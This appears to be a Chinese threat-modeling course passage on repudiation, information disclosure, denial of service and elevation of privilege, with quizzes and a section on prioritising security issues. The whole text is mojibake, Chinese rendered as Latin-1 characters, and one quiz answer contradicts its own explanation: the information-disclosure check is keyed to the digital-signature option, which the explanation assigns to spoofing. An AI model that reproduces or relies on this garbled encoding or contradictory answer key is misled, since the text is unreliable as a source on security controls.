ç³»ç»Ÿä¸ºè®¿é—®æ§åˆ¶åˆ—è¡¨ä¸­åˆ—å‡ºçš„ç”¨æˆ·æˆäºˆç®¡ç†è®¿é—®æƒé™ã€‚ å‚è€ƒç­”æ¡ˆï¼š== C == è§£é‡Šï¼šA. åŠ å¯†é™„ä»¶æ˜¯ä¸å¤Ÿçš„ã€‚ å¯¹æ¶ˆæ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ç¡®ä¿ä¸ä¼šå‘ç”Ÿç¯¡æ”¹ã€‚B. è¿™æ¡é™ˆè¿°é€‚ç”¨äºå¦è®¤æ€§ã€‚C. è¿™æ¡é™ˆè¿°é€‚ç”¨äºç¯¡æ”¹ã€ä¿¡æ¯æ³„éœ²ã€æ‹’ç»æœåŠ¡å’Œæƒé™æå‡ã€‚ å¦è®¤æ€§ - ä¸å®£ç§°å¯¹æ‰§è¡Œçš„æ“ä½œè´Ÿè´£å½“æœ‰äººå‡ºäºæ¶æ„æˆ–æ— æ„é‡‡å–æŸä¸ªæ“ä½œï¼Œä½†å£°æ˜å…¶ä»–æ“ä½œæ—¶ï¼Œå°±ä¼šå‘ç”Ÿå¦è®¤æ€§ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š æ‹’ç»ä¿®æ”¹åŒ…å«æ•æ„Ÿæ“ä½œçš„æ—¥å¿— ä½¿ç”¨å…¶ä»–äººçš„å¸æˆ·ä»¥é¿å…è¢«æŠ“ å£°ç§°æ²¡æœ‰åˆ é™¤æ•°æ®åº“è®°å½• ç³»ç»Ÿæ—¥å¿—æ˜¯æ”»å‡»è€…çš„é‡‘çŸ¿ï¼Œä¸ä»…å¯ç”¨äºæ“çºµï¼Œè€Œä¸”å¯ç”¨äºæ”¶é›†æœ‰å…³ç”¨æˆ·ã€ç¯å¢ƒå’Œå¼±ç‚¹çš„æ•°æ®ã€‚ å¯èƒ½é¢ä¸´å¦è®¤æ€§æ”»å‡»é£é™©çš„å…ƒç´ å’Œäº¤äº’å…ƒç´  åç§° å½¢çŠ¶ å®šä¹‰ è¿‡ç¨‹ ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„æ´»åŠ¨ å¤–éƒ¨å®ä½“ æ§åˆ¶æªæ–½ä¹‹å¤–çš„è¿‡ç¨‹ã€æ•°æ®å­˜å‚¨ï¼Œç”šè‡³å®Œå…¨æˆç†Ÿçš„åº”ç”¨ç¨‹åº æ•°æ®å­˜å‚¨ æ°¸ä¹…æˆ–ä¸´æ—¶çš„æ•°æ®å­˜å‚¨ äº¤äº’ åç§° äº¤äº’ å®šä¹‰ è¿‡ç¨‹ &lt;-&gt; è¿‡ç¨‹ ä¸€ä¸ªä»»åŠ¡ä»ä»»åŠ¡æ¥æ”¶æ•°æ®æˆ–å‘ä»»åŠ¡å‘é€æ•°æ® è¿‡ç¨‹ &lt;-&gt; å¤–éƒ¨å®ä½“ ä¸€ä¸ªä»»åŠ¡å‘ç”¨æˆ·å‘é€æ•°æ®æˆ–ä»ç”¨æˆ·æ¥æ”¶æ•°æ® è¿‡ç¨‹ &lt;-&gt; æ•°æ®å­˜å‚¨ ä¸€ä¸ªä»»åŠ¡å‘æ•°æ®å­˜å‚¨å‘é€æ•°æ®æˆ–ä»æ•°æ®å­˜å‚¨æ¥æ”¶æ•°æ® å¦‚ä½•é˜²æ­¢å¦è®¤æ€§æ”»å‡»ä¸å¯å¦è®¤æ€§é€šè¿‡åˆ›å»ºå’Œä¿æŠ¤å®‰å…¨æ—¥å¿—æ¥ç¡®ä¿æ¯ä¸ªæ“ä½œéƒ½å¯ä»¥è¿½æº¯åˆ°å…¶æ¥æºã€‚ ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶ å¼ºèº«ä»½éªŒè¯ å®‰å…¨æ—¥å¿—è®°å½•å’Œç›‘è§† æ•°å­—ç­¾å å®‰å…¨æ—¶é—´æˆ³ å—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹ æ¨èé—®é¢˜ï¼šæ˜¯å¦å¯ä»¥å°†æ¯ä¸ªæ“ä½œä¸èº«ä»½ç»‘å®šï¼Ÿ çŸ¥è¯†æ£€æŸ¥ å“ªä¸€æ¡é™ˆè¿°æè¿°äº†é’ˆå¯¹å¦è®¤æ€§çš„å®‰å…¨æ§åˆ¶ï¼Ÿ A. å‘é€æ–¹å¯¹æ¶ˆæ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ä¾¿æ¥æ”¶æ–¹äº†è§£æ¶ˆæ¯çš„æ¥æºã€‚ B. ç³»ç»Ÿè®°å½•æ‰€æœ‰æ“ä½œå’Œç”¨æˆ·ï¼Œæ˜ç¡®æ¯ä¸ªäººçš„è´£ä»»ã€‚ C. ç³»ç»Ÿä¸ºè®¿é—®æ§åˆ¶åˆ—è¡¨ä¸­åˆ—å‡ºçš„ç”¨æˆ·æˆäºˆç®¡ç†è®¿é—®æƒé™ã€‚ å‚è€ƒç­”æ¡ˆï¼š== B == è§£é‡Šï¼šA. æ­¤æ¶ˆæ¯é€‚ç”¨äºæ¬ºéª—ã€‚B. è¿™æ¡é™ˆè¿°é€‚ç”¨äºå¦è®¤æ€§ã€‚C. è¿™æ¡é™ˆè¿°é€‚ç”¨äºç¯¡æ”¹ã€ä¿¡æ¯æ³„éœ²ã€æ‹’ç»æœåŠ¡å’Œæƒé™æå‡ã€‚ ä¿¡æ¯æ³„æ¼ - æŸ¥çœ‹ä¸åº”æŸ¥çœ‹çš„æ•°æ®å‘æœªç»æˆæƒçš„ä¸ªäººå…¬å¼€æ•æ„Ÿæ•°æ®æ—¶ï¼Œä¼šå‘ç”Ÿä¿¡æ¯æ³„æ¼ã€‚ æ— è®ºæ˜¯åœ¨æœ‰æ„æˆ–æ— æ„çš„æƒ…å†µä¸‹ï¼Œéƒ½æœ‰å¯èƒ½å‘ç”Ÿä¿¡æ¯æ³„éœ²ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ç³»ç»Ÿé€šè¿‡é”™è¯¯æ¶ˆæ¯æ³„éœ²æ•æ„Ÿæ•°æ® ç”¨æˆ·è®¿é—®å®‰å…¨æ§åˆ¶è¾ƒå¼±çš„æœªæˆæƒæ–‡æ¡£å’Œæ–‡ä»¶å¤¹ ç”¨æˆ·è®¿é—®æµç»éå®‰å…¨ç½‘ç»œçš„æ•°æ® å¯èƒ½é¢ä¸´ä¿¡æ¯æ³„æ¼é£é™©çš„å…ƒç´ å’Œäº¤äº’å…ƒç´  åç§° å½¢çŠ¶ å®šä¹‰ è¿‡ç¨‹ ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„æ´»åŠ¨ æ•°æ®å­˜å‚¨ æ°¸ä¹…æˆ–ä¸´æ—¶çš„æ•°æ®å­˜å‚¨ æ•°æ®æµ å…ƒç´ ä¹‹é—´çš„æ•°æ®ç§»åŠ¨ äº¤äº’ åç§° äº¤äº’ å®šä¹‰ è¿‡ç¨‹ &lt;-&gt; è¿‡ç¨‹ ä¸€ä¸ªä»»åŠ¡å°†æ•°æ®å‘é€åˆ°å¦ä¸€ä¸ªä»»åŠ¡ è¿‡ç¨‹ &lt;-&gt; å¤–éƒ¨å®ä½“ ä¸€ä¸ªä»»åŠ¡å‘ç”¨æˆ·å‘é€æ•°æ®æˆ–ä»ç”¨æˆ·æ¥æ”¶æ•°æ® è¿‡ç¨‹ &lt;-&gt; æ•°æ®å­˜å‚¨ ä¸€ä¸ªä»»åŠ¡å‘æ•°æ®å­˜å‚¨å‘é€æ•°æ®æˆ–ä»æ•°æ®å­˜å‚¨æ¥æ”¶æ•°æ® æ•°æ®æµ &lt;-&gt; ä¿¡ä»»è¾¹ç•Œ é€šè¿‡ Internet å°†æ•°æ®ä»å—ä¿¡ä»»çš„ç¯å¢ƒä¼ è¾“ç»™æŸäººï¼ˆåä¹‹äº¦ç„¶ï¼‰ å¦‚ä½•é˜²æ­¢ä¿¡æ¯æ³„æ¼æœºå¯†æ€§ç¡®ä¿æ•°æ®å—åˆ°ä¿æŠ¤ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š åº”ç”¨è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼Œä»¥ç¡®ä¿åˆé€‚çš„ç”¨æˆ·å¯ä»¥è®¿é—®é€‚å½“çš„æ•°æ® åŠ å¯†é™æ€æ•°æ®ã€ä¼ è¾“ä¸­æ•°æ®å’Œæ­£åœ¨ä½¿ç”¨çš„æ•°æ® å¼ºåˆ¶å®æ–½ SSL/TLS ä»¥ä¿æŠ¤ä¼ è¾“ ä½¿ç”¨ IPSec éš§é“ä¿æŠ¤è·¨ç»ˆç»“ç‚¹çš„é€šä¿¡ ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶ åŠ å¯† è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL) æ¨èé—®é¢˜ï¼šæ˜¯å¦å¯ä»¥ç¡®ä¿æ²¡æœ‰äººèƒ½æŸ¥çœ‹æˆ‘çš„ä¼ è¾“ä¸­çš„æ•°æ®å’Œé™æ€æ•°æ®ï¼Ÿ çŸ¥è¯†æ£€æŸ¥ å“ªä¸€æ¡é™ˆè¿°æè¿°äº†é’ˆå¯¹ä¿¡æ¯æ³„æ¼çš„å®‰å…¨æ§åˆ¶ï¼Ÿ A. å‘é€æ–¹å¯¹æ¶ˆæ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ä¾¿æ¥æ”¶æ–¹äº†è§£æ¶ˆæ¯çš„æ¥æºã€‚ B. ç³»ç»Ÿä¸ºè®¿é—®æ§åˆ¶åˆ—è¡¨ä¸­åˆ—å‡ºçš„ç”¨æˆ·æˆäºˆç®¡ç†è®¿é—®æƒé™ã€‚ C. ç³»ç»Ÿè®°å½•æ‰€æœ‰æ“ä½œå’Œç”¨æˆ·ï¼Œæ˜ç¡®æ¯ä¸ªäººçš„è´£ä»»ã€‚ å‚è€ƒç­”æ¡ˆï¼š== A == è§£é‡Šï¼šA. æ­¤æ¶ˆæ¯é€‚ç”¨äºæ¬ºéª—ã€‚B. è¿™æ¡é™ˆè¿°é€‚ç”¨äºç¯¡æ”¹ã€ä¿¡æ¯æ³„éœ²ã€æ‹’ç»æœåŠ¡å’Œæƒé™æå‡ã€‚C. è¿™æ¡é™ˆè¿°é€‚ç”¨äºå¦è®¤æ€§ã€‚ æ‹’ç»æœåŠ¡ - ç³»ç»Ÿç¹å¿™å½“æ”»å‡»è€…å¯¼è‡´ç³»ç»Ÿä¸å¯ç”¨æ—¶ï¼Œå°†å‘ç”Ÿæ‹’ç»æœåŠ¡ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š å‘ç½‘ç»œå‘é€å¤§é‡è¯·æ±‚ å ç”¨å†…å­˜å’Œ CPU è¿›ç¨‹ è¯·æ±‚æ•°é‡è¿‡å¤šå¯¼è‡´æ•°æ®å­˜å‚¨å´©æºƒ å¯èƒ½é¢ä¸´æ‹’ç»æœåŠ¡é£é™©çš„å…ƒç´ å’Œäº¤äº’å…ƒç´  åç§° å½¢çŠ¶ å®šä¹‰ è¿‡ç¨‹ ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„æ´»åŠ¨ æ•°æ®å­˜å‚¨ æ°¸ä¹…æˆ–ä¸´æ—¶çš„æ•°æ®å­˜å‚¨ æ•°æ®æµ å…ƒç´ ä¹‹é—´çš„æ•°æ®ç§»åŠ¨ äº¤äº’ åç§° äº¤äº’ å®šä¹‰ è¿‡ç¨‹ &lt;-&gt; è¿‡ç¨‹ ä¸€ä¸ªä»»åŠ¡å°†æ•°æ®å‘é€åˆ°å¦ä¸€ä¸ªä»»åŠ¡ è¿‡ç¨‹ &lt;-&gt; å¤–éƒ¨å®ä½“ ä¸€ä¸ªä»»åŠ¡å‘ç”¨æˆ·å‘é€æ•°æ®æˆ–ä»ç”¨æˆ·æ¥æ”¶æ•°æ® è¿‡ç¨‹ &lt;-&gt; æ•°æ®å­˜å‚¨ ä¸€ä¸ªä»»åŠ¡å‘æ•°æ®å­˜å‚¨å‘é€æ•°æ®æˆ–ä»æ•°æ®å­˜å‚¨æ¥æ”¶æ•°æ® æ•°æ®æµ &lt;-&gt; ä¿¡ä»»è¾¹ç•Œ é€šè¿‡ Internet å°†æ•°æ®ä»å—ä¿¡ä»»çš„ç¯å¢ƒä¼ è¾“ç»™æŸäººï¼ˆåä¹‹äº¦ç„¶ï¼‰ å¦‚ä½•é˜²æ­¢æ‹’ç»æœåŠ¡å¯ç”¨æ€§ç¡®ä¿ç³»ç»Ÿä¸ºç”¨æˆ·å¯åŠ¨ä¸”æ­£å¸¸è¿è¡Œã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ä½¿ç”¨ç½‘ç»œè®¿é—®æ§åˆ¶åˆ—è¡¨æ§åˆ¶ä¼ å…¥å’Œä¼ å‡ºçš„æµé‡ ä½¿ç”¨å¼¹æ€§èµ„æºç®¡ç†ä¸æ–­å¢åŠ æˆ–å‡å°‘çš„ä½¿ç”¨é‡ ç›‘è§†ç³»ç»Ÿä»¥æ£€æµ‹æ˜¯å¦å‡ºç°å¼‚å¸¸ å¯ç”¨æ“ä½œç³»ç»Ÿæ ‡å¿—æ¥å¤„ç†å†…å­˜å’Œ CPU è¿›ç¨‹ ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶ è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL) ç­›é€‰ é…é¢ æˆæƒ é«˜å¯ç”¨æ€§ æ¨èé—®é¢˜ï¼šæˆ‘çš„æœåŠ¡åœ¨æŸäº›åœ°åŒºæ˜¯å¦ä¼šè¢«é™åˆ¶èµ„æºï¼Ÿ çŸ¥è¯†æ£€æŸ¥ å“ªä¸€æ¡é™ˆè¿°æè¿°äº†é’ˆå¯¹æ‹’ç»æœåŠ¡çš„å®‰å…¨æ§åˆ¶ï¼Ÿ A. å‘é€æ–¹å¯¹æ¶ˆæ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ä¾¿æ¥æ”¶æ–¹äº†è§£æ¶ˆæ¯çš„æ¥æºã€‚ B. ç³»ç»Ÿè®°å½•æ‰€æœ‰æ“ä½œå’Œç”¨æˆ·ï¼Œæ˜ç¡®æ¯ä¸ªäººçš„è´£ä»»ã€‚ C. ç³»ç»Ÿä¾é å¼¹æ€§èµ„æºæ¥å¤„ç†æ¥æ”¶åˆ°çš„æ›´å¤šè¯·æ±‚ã€‚ å‚è€ƒç­”æ¡ˆï¼š== C == è§£é‡Šï¼šA. æ­¤æ¶ˆæ¯é€‚ç”¨äºæ¬ºéª—ã€‚B. è¿™æ¡é™ˆè¿°é€‚ç”¨äºå¦è®¤æ€§C. è¿™æ¡é™ˆè¿°é€‚ç”¨äºæ‹’ç»æœåŠ¡ã€‚ æƒé™æå‡ - æ‹¥æœ‰æœ¬ä¸åº”è¯¥æœ‰ç”¨çš„æƒé™ä¸ªäººæœªç»è®¸å¯è®¿é—®èµ„æºæ—¶ï¼Œå°±ä¼šå‘ç”Ÿæƒé™æå‡ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š åˆ©ç”¨è¾“å…¥å¤„ç†é€»è¾‘æˆ–å†…å­˜ä¸­çš„å¼±ç‚¹æ¥æå–æ•°æ® æŸ¥æ‰¾å¹¶ä½¿ç”¨ç‰¹æƒå¸æˆ·ç ´åæœåŠ¡ï¼ˆä¸æ¬ºéª—å’Œç¯¡æ”¹å¨èƒç»“åˆä½¿ç”¨ï¼‰ å¯èƒ½é¢ä¸´æƒé™æå‡ é£é™©çš„å…ƒç´ å’Œäº¤äº’å…ƒç´  åç§° å½¢çŠ¶ å®šä¹‰ è¿‡ç¨‹ ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„æ´»åŠ¨ äº¤äº’ åç§° äº¤äº’ å®šä¹‰ è¿‡ç¨‹ &lt;-&gt; è¿‡ç¨‹ ä¸€ä¸ªä»»åŠ¡å°†æ•°æ®å‘é€åˆ°å¦ä¸€ä¸ªä»»åŠ¡ è¿‡ç¨‹ &lt;-&gt; å¤–éƒ¨å®ä½“ ä»»åŠ¡æ¥æ”¶æ¥è‡ªç”¨æˆ·çš„æ•°æ® è¿‡ç¨‹ &lt;-&gt; æ•°æ®å­˜å‚¨ ä»»åŠ¡æ¥æ”¶æ¥è‡ªæ•°æ®å­˜å‚¨çš„æ•°æ® å¦‚ä½•é˜²æ­¢æƒé™æå‡æˆæƒç¡®ä¿ç”¨æˆ·æ‹¥æœ‰é€‚å½“çš„æƒé™ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š å®ç°æˆæƒæœºåˆ¶ä»¥éªŒè¯å¯¹æ•°æ®å’Œèµ„æºçš„æƒé™ åº”ç”¨å®‰å…¨æ§åˆ¶ï¼Œä»¥ä½¿ç”¨æœ€å°‘çš„è®¿é—®æƒé™è¿è¡ŒæœåŠ¡ ç›‘è§†è®¿é—®ä»¥æ£€æµ‹å¼‚å¸¸å’Œæœªç»æˆæƒçš„è®¿é—®å°è¯•ã€‚ ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶ è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL) åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ (RBAC) åŸºäºç»„çš„è®¿é—® æƒé™ è¾“å…¥éªŒè¯ æ¨èé—®é¢˜ï¼šå¦‚ä½•å¾—çŸ¥ç”¨æˆ·å¯ä»¥æ‰§è¡Œæ­¤æ“ä½œï¼Ÿ çŸ¥è¯†æ£€æŸ¥ å“ªä¸€æ¡é™ˆè¿°æè¿°äº†é’ˆå¯¹æƒé™æå‡çš„å®‰å…¨æ§åˆ¶ï¼Ÿ A. ç³»ç»Ÿä½¿ç”¨å°½å¯èƒ½å°‘çš„æƒé™è¿è¡Œè¿›ç¨‹ã€‚ B. å‘é€æ–¹å¯¹æ¶ˆæ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ä¾¿æ¥æ”¶æ–¹äº†è§£æ¶ˆæ¯çš„æ¥æºã€‚ C. ç³»ç»Ÿè®°å½•æ‰€æœ‰æ“ä½œå’Œç”¨æˆ·ï¼Œæ˜ç¡®æ¯ä¸ªäººçš„è´£ä»»ã€‚ å‚è€ƒç­”æ¡ˆï¼š== A == è§£é‡Šï¼šA. è¿™æ¡é™ˆè¿°é€‚ç”¨äºæƒé™æå‡ã€‚B. æ­¤æ¶ˆæ¯é€‚ç”¨äºæ¬ºéª—ã€‚C. è¿™æ¡é™ˆè¿°é€‚ç”¨äºå¦è®¤æ€§ã€‚ å°ç»“æ‘˜è¦å¨èƒå»ºæ¨¡æ¡†æ¶å¯å¸®åŠ©ä½ ç”Ÿæˆæ½œåœ¨å¨èƒçš„åˆ—è¡¨ï¼Œå¹¶æ‰¾åˆ°é™ä½æˆ–æ¶ˆé™¤ç³»ç»Ÿé£é™©çš„æ–¹æ³•ã€‚ äº†è§£æ¯ç§å¨èƒç±»åˆ«åŠå…¶ç›¸åº”çš„å®‰å…¨æ§åˆ¶ã€‚ æœ¬æ¨¡å—æ¶µç›–äº†ä»¥ä¸‹å†…å®¹ï¼š è®¨è®ºäº†å¨èƒå»ºæ¨¡æ¡†æ¶ä¸­çš„æ¯ç§å¨èƒç±»åˆ« äº†è§£äº†æœ‰åŠ©äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å®‰å…¨æ§åˆ¶ ä½ çŸ¥é“å—ï¼Ÿ å¯ä»¥ä½¿ç”¨è®¸å¤šå…¶ä»–æ¡†æ¶æ¥å®ç°ä¸åŒçš„ç›®æ ‡ã€‚ ä¾‹å¦‚ï¼Œæ¸—é€æµ‹è¯•å›¢é˜Ÿå¯å°† LINDDUN ç”¨äºéšç§å¨èƒå’Œæ”»å‡»æ ‘ã€‚ æ”»å‡»æ ‘æœ‰åŠ©äºé€šè¿‡â€œå‡å®šè¿è§„â€æ€ç»´æ¥ç¡®å®šæ”»å‡»å¯èƒ½å‘ç”Ÿçš„æ–¹å¼ã€‚ äº†è§£è¯¦ç»†ä¿¡æ¯ LINDDUN - ä¸€ç§éšç§å¨èƒå»ºæ¨¡æ–¹æ³•ï¼Œæ”¯æŒåˆ†æäººå‘˜ç³»ç»Ÿåœ°æŸ¥æ‰¾å’Œè§£å†³è½¯ä»¶ä½“ç³»ç»“æ„ä¸­çš„éšç§å¨èƒã€‚ ç½‘ç»œç»ˆæ­¢é“¾ - ä»‹ç»å…¸å‹çš„å·¥ä½œæµï¼ŒåŒ…æ‹¬æ”»å‡»è€…ç”¨äºæ¸—å…¥ç»„ç»‡ç½‘ç»œå’Œç³»ç»Ÿçš„æŠ€æœ¯ã€ç­–ç•¥å’Œè¿‡ç¨‹ã€‚ è¡¥ä¸Šä¸€ä¸ªå¾®è½¯å®‰å…¨åšå®¢ ï¼ˆ https://www.microsoft.com/security/blog/ æ¨¡å—6 | è®¾ç½®é—®é¢˜çš„ä¼˜å…ˆçº§å¹¶åº”ç”¨å®‰å…¨æ§åˆ¶æªæ–½ä»‹ç»å¨èƒå»ºæ¨¡æ¡†æ¶å¯ä»¥å¸®åŠ©ä½ ç”Ÿæˆå¨èƒåˆ—è¡¨å’Œé™ä½é£é™©çš„æ–¹æ³•ï¼Œä½†ä¸ä¼šä¸ºä½ ç¡®å®šå…¶ä¼˜å…ˆçº§ã€‚ æ­¤å¤–ï¼Œå®ƒä¸ä¼šåŸºäºå®‰å…¨æ§åˆ¶æªæ–½çš„ç±»å‹å’ŒåŠŸèƒ½æä¾›åˆ†å±‚å»ºè®®ï¼Œå› æ­¤æ›´éš¾ç¡®å®šè¦å®ç°å“ªäº›æ§åˆ¶æªæ–½ã€‚ ç¡®å®é—®é¢˜çš„ä¼˜å…ˆçº§ç¡®å®šé—®é¢˜çš„ä¼˜å…ˆçº§æ˜¯å¨èƒå»ºæ¨¡ä¸­ä¸€ä¸ªé‡è¦çš„éƒ¨åˆ†ã€‚ åœ¨èµ„æºæœ‰é™çš„æƒ…å†µä¸‹ï¼Œå®ƒå¯ä»¥å¸®åŠ©å°†èµ„æºåˆ†é…ç»™æœ€å…³é”®çš„é—®é¢˜ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š å¿…é¡»é€‰æ‹©æ˜¯è¦å®ç°è®°å½•æ‰€æœ‰ç®¡ç†æ“ä½œçš„åŠŸèƒ½ï¼Œè¿˜æ˜¯ä½¿ç”¨ SSL/TLS å¯¹æµé‡è¿›è¡ŒåŠ å¯† ç¡®å®šæ˜¯å…ˆå®ç°è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼Œè¿˜æ˜¯å…ˆå¢å¼ºç³»ç»Ÿçš„è¾“å…¥éªŒè¯è¿‡ç¨‹ ä½•æ—¶è®¾ç½®ä¼˜å…ˆçº§æ ¹æ®æ¯ä¸ªé—®é¢˜çš„é£é™©å› ç´ å¯¹å…¶æŒ‡å®šä¼˜å…ˆçº§ã€‚ æ­¤å¤–ï¼Œé€‰æ‹©å¯ä¸å…¶ä»–æªæ–½è”ç”¨çš„å®‰å…¨æ§åˆ¶æªæ–½ï¼Œå¯å¸®åŠ©ä¸ºä½ çš„ç³»ç»Ÿæä¾›åˆ†å±‚å®‰å…¨ä¿æŠ¤æœºåˆ¶ã€‚ æ­¤è¿‡ç¨‹å¯èƒ½éœ€è¦ä¸€æ®µæ—¶é—´æ‰èƒ½å®Œæˆã€‚ è¿˜éœ€è¦åŒäº‹å’Œå®‰å…¨å›¢é˜Ÿçš„å¸®åŠ©ã€‚ è¯·ç•™å‡ºè¶³å¤Ÿçš„æ—¶é—´æ¥ä¸å…¶åä½œã€‚ å­¦ä¹ ç›®æ ‡åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†èƒ½å¤Ÿï¼š å¯¹é—®é¢˜åˆ†é…ä¼˜å…ˆçº§ å¯¹å®‰å…¨æ§åˆ¶è¿›è¡Œåˆ†ç±» äº†è§£æ¯ä¸ªå®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½ æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ é—®é¢˜ä¼˜å…ˆçº§ã€å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½å¨èƒå»ºæ¨¡ç»ƒä¹ å¯å¸®åŠ©ä½ å‘ç°ä¸€äº›é—®é¢˜ï¼Œæœ‰æ—¶è¿˜ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„æ”¶è·ã€‚ ç¼ºå°‘ä¼˜å…ˆçº§å¯èƒ½ä¼šè®©å·¥ç¨‹å¸ˆæ„Ÿåˆ°ä¸çŸ¥æ‰€æªï¼Œæ— æ³•ç¡®å®šè¦é¦–å…ˆè§£å†³å“ªäº›é—®é¢˜ã€‚ æ–¹æ³•é¦–å…ˆï¼Œç¡®å®šé—®é¢˜å¯¹äºç³»ç»Ÿçš„é‡è¦ç¨‹åº¦ã€‚ ç„¶åï¼Œé€‰æ‹©æœ‰åˆ©äºä»¥æœ€ä½çš„æˆæœ¬æä¾›æœ€å¤§ç¨‹åº¦ä¿æŠ¤çš„å®‰å…¨æ§åˆ¶æªæ–½ã€‚ ç¡®å®šå®‰å…¨é—®é¢˜çš„ä¼˜å…ˆçº§æ ¹æ®é£é™©ä¸¥é‡æ€§æ¥ç¡®å®šå®‰å…¨é—®é¢˜çš„ä¼˜å…ˆçº§ã€‚ å„ç»„ç»‡çš„æ ‡ç­¾å¯èƒ½ä¸åŒã€‚ ä½†é€šå¸¸ä¼šæ ¹æ®å¨èƒè¢«æ”»å‡»è€…åˆ©ç”¨æ—¶å¸¦æ¥çš„é£é™©å½±å“ï¼Œä»¥ä»ä¸¥é‡åˆ°ä½é£é™©çš„æ¨¡å¼è®¾ç½®ä¼˜å…ˆçº§æ ‡ç­¾ã€‚ ç±»å‹å’ŒåŠŸèƒ½å®‰å…¨æ§åˆ¶å…·æœ‰ä¸åŒçš„ç±»å‹å’ŒåŠŸèƒ½ã€‚ æœ‰ä¸‰ä¸ªä¸»è¦çš„ç±»åˆ«å¯å¸®åŠ©ä½ å…³æ³¨å®‰å…¨æ€§çš„ä¸‰ç§å½¢å¼ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ç‰©ç†ï¼šæ‘„åƒå¤´ã€å¾½ç« å’Œå›´æ  æŠ€æœ¯ï¼šåŠ å¯†ã€è™šæ‹Ÿé˜²ç«å¢™å’Œé˜²ç—…æ¯’è½¯ä»¶ ç®¡ç†ï¼šç­–ç•¥ã€æ³•è§„å’Œä¹¦é¢è¦æ±‚ åŠŸèƒ½çš„æ„ä¹‰åœ¨äºé’ˆå¯¹æ½œåœ¨å¨èƒæ¯ä¸ªé˜¶æ®µå¸®åŠ©ä¿æŠ¤ç³»ç»Ÿã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ç”¨é”é˜²æ­¢å…¥ä¾µ å®‰è£…æ‘„åƒå¤´æ¥æ£€æµ‹å…¥ä¾µ åˆ¶å®šå…¥ä¾µå“åº”è®¡åˆ’ ä¿®å¤ç”±å…¥ä¾µå¯¼è‡´çš„ç ´å ä½¿ç”¨æ ‡å¿—å’Œå…¶ä»–å®‰å…¨æ§åˆ¶æªæ–½é˜²æ‚£äºæœªç„¶ åœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªå•å…ƒä¸­ï¼Œæˆ‘ä»¬å°†äº†è§£ä¼˜å…ˆçº§ã€ç±»å‹å’ŒåŠŸèƒ½ã€‚ è®¾ç½®å®‰å…¨é—®é¢˜çš„ä¼˜å…ˆçº§ç”ŸæˆåŒ…å«é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•çš„å¨èƒåˆ—è¡¨ã€‚ ç„¶åï¼Œä¸åŒäº‹åˆä½œåˆ†é…ä¼˜å…ˆçº§ã€‚ é€‰æ‹©ä¼˜å…ˆçº§æ¡†æ¶ä¼˜å…ˆçº§ç»ƒä¹ åº”éµå¾ªç»„ç»‡åˆ›å»ºçš„å†…éƒ¨å®‰å…¨ bug æ ã€‚ Microsoft å·¥ç¨‹å¸ˆä½¿ç”¨çš„å†…éƒ¨ bug æ ç±»ä¼¼äºä¸‹è¡¨ï¼Œä¾›ä½ å‚è€ƒï¼š Microsoft å·¥ç¨‹å¸ˆä½¿ç”¨çš„å†…éƒ¨ bug æ ç±»ä¼¼äºä¸‹è¡¨ï¼Œä¾›ä½ å‚è€ƒï¼š å›¾æ ‡ ä¸¥é‡æ€§ è¯´æ˜ ä¸¥é‡ å¯èƒ½ä¼šå¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆä¸¥é‡å½±å“ã€‚ ç¤ºä¾‹åŒ…æ‹¬æ¶‰åŠæ•æ„Ÿä¿¡æ¯æ³„æ¼çš„è¡Œä¸ºå’Œéœ€è¦éšç§å’Œæ³•å¾‹å‚ä¸çš„å¨èƒ é‡è¦è¯´æ˜ å¯èƒ½ä¼šå¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆä¸¥é‡å½±å“ã€‚ ç¤ºä¾‹åŒ…æ‹¬åœ¨æ²¡æœ‰å·²çŸ¥çš„è§£å†³æ–¹æ³•æ—¶æ˜¾ç¤ºç³»ç»Ÿä¸å¯ç”¨ é€‚ä¸­ 